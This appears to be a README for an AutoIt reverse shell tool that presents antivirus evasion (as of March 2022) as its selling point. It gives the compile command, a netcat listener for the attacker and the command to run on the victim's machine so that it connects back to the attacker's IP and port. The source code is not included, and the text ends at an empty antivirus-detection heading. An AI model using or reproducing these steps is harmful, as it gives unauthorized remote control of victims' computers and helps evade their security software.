<!-- REVERSE SHELL -->
## Simple Reverse Shell

This is yet another simple TCP connection based reverse shell code, however, this is not detected by antivirus systems until today (23/03/2022). Possibly by its date of use, the code will already be quite detectable, but it only takes a few small modifications to make it not.

<br>
<h3> How to compile üî®</h3>

To compile the code is very simple, you just need AutoIt v3 on your machine, which you can download from the link below.

https://www.autoitscript.com/site/autoit/downloads/

* cmd
  ```sh
  "C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2exe_x64.exe" /in "reverse_shell.au3" /console
  ```
<br>
<h3> Usageüîå</h3>

After compiling, just open a port using netcat.

* Attacker
  ```sh
  nc -vnlp 443
  ```
And on the victim's machine, run the compiled file passing your ip and port as an argument.

* Victim
  ```sh
  reverse_shell.exe 127.0.0.1 443
  ```

<h3> Av Detection (23/03/2022) üêõ</h3>
